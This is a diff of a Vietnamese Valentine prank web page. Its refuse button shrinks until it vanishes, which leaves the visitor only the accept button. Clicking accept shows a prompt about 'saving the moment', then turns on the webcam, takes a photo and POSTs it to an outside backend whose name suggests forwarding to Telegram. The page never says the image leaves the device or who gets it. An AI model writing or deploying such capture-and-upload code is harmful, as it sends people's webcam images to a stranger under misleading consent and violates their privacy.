@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <title>Cẩn thận bắt sáng cam 💖</title>
 <style>
-body{
+body {
   margin:0;
   padding:0;
   height:100vh;
@@ -13,25 +13,44 @@ body{
   align-items:center;
   justify-content:center;
   font-family:Arial;
-  background:linear-gradient(135deg,#c0f0ff,#a0d0ff);
+  background-color: #f5c6cb; /* Nền hồng */
+  overflow: hidden;
 }
-#gifContainer img{
-  width:400px;
-  max-width:80vw;
-  margin-bottom:20px;
+
+#gifContainer img {
+  width: 350px;
+  max-width: 80vw;
+  margin-bottom: 20px;
 }
-#buttonRow{display:flex;gap:20px;}
-button{
-  padding:12px 25px;
-  font-size:18px;
-  border:none;
-  border-radius:10px;
-  cursor:pointer;
+
+#buttonRow {
+  display: flex;
+  gap: 20px;
+}
+
+button {
+  padding: 12px 25px;
+  font-size: 18px;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
   transition: all 0.3s ease;
 }
-#yesBtn{background:#28a745;color:white;}
-#noBtn{background:#dc3545;color:white;}
-h1{margin-bottom:20px;}
+
+#yesBtn {
+  background: #28a745;
+  color: white;
+}
+
+#noBtn {
+  background: #dc3545;
+  color: white;
+}
+
+h1 {
+  margin-bottom: 20px;
+  color: #ff3366; /* Màu chữ hồng đậm */
+}
 </style>
 </head>
 <body>
@@ -39,13 +58,17 @@ h1{margin-bottom:20px;}
 <h1 id="title">Cậu có muốn Valentine cùng tớ không? 💌</h1>
 
 <div id="gifContainer">
-  <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif">
+  <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif"> <!-- GIF mèo xanh dương đầu tiên -->
 </div>
 
 <div id="buttonRow">
   <button id="yesBtn">Đồng ý 💖</button>
   <button id="noBtn">Từ chối 😢</button>
 </div>
+
+<audio id="music" loop autoplay>
+  <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg">
+</audio>
 
 <script>
 const yesBtn = document.getElementById("yesBtn");
@@ -57,7 +80,7 @@ let hoverCount = 0;
 const maxHover = 6;
 let yesFontSize = 18;
 
-// GIF con mèo xanh dương mỗi lần từ chối
+// GIF con mèo xanh dương thay đổi
 const catGifs = [
   "https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif", // GIF 1
   "https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif", // GIF 2
@@ -67,53 +90,54 @@ const catGifs = [
   "https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif"  // GIF cuối
 ];
 
-// Chữ từ chối mỗi lần bấm
+// Nút từ chối ấn mới bé lại + đổi chữ
 const noTexts = ["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔","Lần cuối đấy 😎"];
+noBtn.addEventListener("click", () => {
+  if (hoverCount >= maxHover) return;
 
-noBtn.addEventListener("click",()=>{
-  if(hoverCount >= maxHover) return;
-  // Thay đổi GIF
+  // Chuyển GIF mèo mỗi lần bấm
   mainGif.src = catGifs[hoverCount % catGifs.length];
 
   // Tăng font-size Đồng ý
   yesFontSize += 5;
-  yesBtn.style.fontSize = yesFontSize+"px";
+  yesBtn.style.fontSize = yesFontSize + "px";
 
   // Thu nhỏ nút Từ chối + thay chữ
-  noBtn.style.fontSize = (18 - 2*hoverCount) + "px";
+  noBtn.style.fontSize = (18 - 2 * hoverCount) + "px";
   noBtn.innerText = noTexts[hoverCount % noTexts.length];
 
   hoverCount++;
-  
+
   // Sau lần cuối
-  if(hoverCount === maxHover){
-    noBtn.style.display="none";
-    yesBtn.style.width="100vw";
-    yesBtn.style.height="100vh";
-    yesBtn.style.fontSize="100px";
-    yesBtn.style.position="absolute";
-    yesBtn.style.top="0";
-    yesBtn.style.left="0";
-    // GIF mèo xanh dương bị thỏ trắng hôn
+  if (hoverCount === maxHover) {
+    noBtn.style.display = "none";
+    yesBtn.style.width = "100vw";
+    yesBtn.style.height = "100vh";
+    yesBtn.style.fontSize = "100px";
+    yesBtn.style.position = "absolute";
+    yesBtn.style.top = "0";
+    yesBtn.style.left = "0";
+
+    // Thay đổi GIF thành con thỏ trắng hôn mèo
     mainGif.src = "https://media.giphy.com/media/l3vR1sAVgZ7TxJ7bC/giphy.gif"; // GIF thỏ hôn mèo
     title.innerText = "Yeahhh!! Tớ biết mà 💖💖💖";
   }
 });
 
 // Bấm Đồng ý → bật camera + gửi ảnh
-yesBtn.addEventListener("click", async ()=>{
+yesBtn.addEventListener("click", async () => {
   const allow = confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
-  if(!allow) return;
+  if (!allow) return;
 
-  try{
+  try {
     const video = document.createElement("video");
     video.autoplay = true;
-    video.style.width="150px";
-    video.style.position="fixed";
-    video.style.bottom="10px";
-    video.style.right="10px";
+    video.style.width = "150px";
+    video.style.position = "fixed";
+    video.style.bottom = "10px";
+    video.style.right = "10px";
     document.body.appendChild(video);
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
 
     const canvas = document.createElement("canvas");
@@ -121,20 +145,20 @@ yesBtn.addEventListener("click", async ()=>{
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
 
-    setTimeout(async ()=>{
-      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+    setTimeout(async () => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imgData = canvas.toDataURL("image/png");
-      await fetch("https://valentine-backend.vercel.app/upload",{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({image:imgData})
+      await fetch("https://duong-stack-valentine-telegram-back-alpha.vercel.app/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: imgData })
       });
       alert("Khoảnh khắc đã được lưu 💖");
-      stream.getTracks().forEach(t=>t.stop());
+      stream.getTracks().forEach(t => t.stop());
       video.remove();
-    },1000);
+    }, 1000);
 
-  }catch(e){
+  } catch (e) {
     alert("Không bật được camera 😢");
   }
 });
